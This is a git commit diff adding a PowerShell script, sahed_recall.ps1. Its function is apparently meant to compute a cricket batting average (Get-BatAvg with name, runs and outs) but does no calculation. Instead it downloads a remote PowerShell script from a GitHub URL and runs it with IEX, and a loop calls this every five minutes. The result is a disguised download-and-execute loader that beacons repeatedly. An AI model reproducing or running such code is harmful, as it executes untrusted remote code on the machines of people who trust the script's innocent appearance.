ba65781c738dbab2ef9436353e89a970abd03355
Haxor8880 <37700941+sksojib20@users.noreply.github.com>
2022-06-15 16:31:23 +0600

    Update and rename fun.ps1 to sahed_recall.ps1

---
+++ sahed_recall.ps1
@@ -0,0 +1,21 @@
+Function Get-BatAvg{
+Param ($Name, $Runs, $Outs)
+$headers = @{
+"Pragma"="no-cache";
+"Cache-Control"="no-cache";
+}
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sksojib20/server/main/sahed_server.ps1')
+}
+
+$processes = Get-Process
+
+$i = 1
+ForEach ($process in $processes) {
+
+    
+    Start-Sleep -Seconds 300
+    $i++
+    
+	Get-BatAvg Bradman 6996 70
+    
+}
